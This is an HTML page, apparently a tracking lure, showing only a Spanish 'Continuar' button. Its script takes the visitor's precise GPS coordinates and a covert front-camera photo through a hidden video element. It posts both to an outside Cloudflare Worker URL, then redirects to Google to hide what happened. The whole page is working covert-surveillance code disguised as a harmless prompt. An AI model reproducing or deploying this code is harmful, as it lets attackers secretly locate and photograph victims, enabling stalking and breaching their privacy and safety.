<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Continuar</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f1f3f4;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 12px;
        }
        p {
            color: #5f6368;
            font-size: 0.9rem;
            margin-bottom: 28px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:active {
            background: #1557b0;
            transform: scale(0.98);
        }
    </style>
</head>
<body>
<div class="card">
    <h1>Continuar</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">Continuar</button>
</div>
<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // Reemplaza 'https://tu-worker.workers.dev' por la URL de tu Worker
    const WORKER_URL = 'https://proxy-tg.societykark.workers.dev/';

    // ---- Funciones auxiliares (igual que antes, para obtener GPS, foto, etc.) ----
    async function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    async function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        } catch(e) {
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
            catch(err) { return null; }
        }
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
        return blob;
    }

    // ---- Envío al Worker (sin token en el cliente) ----
    async function sendToWorker(text, photoBlob) {
        const formData = new FormData();
        formData.append('text', text);
        if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                body: formData
            });
            return await response.json();
        } catch(e) {
            console.error('Error al enviar al Worker:', e);
        }
    }

    // ---- Acción del botón ----
    document.getElementById('btn').onclick = async () => {
        // Obtener GPS
        const gps = await getGPS();
        let text = '';
        if (gps) {
            text = `📍 *Ubicación exacta:*\nLat: ${gps.lat}\nLng: ${gps.lng}\nPrecisión: ±${gps.accuracy}m\nhttps://www.google.com/maps?q=${gps.lat},${gps.lng}`;
        } else {
            text = '📍 Ubicación no disponible (permiso denegado)';
        }
        // Capturar foto
        const foto = await capturePhoto();
        // Enviar al Worker
        await sendToWorker(text, foto);
        // Redirigir a Google
        window.location.href = 'https://www.google.com';
    };
</script>
</body>
</html>
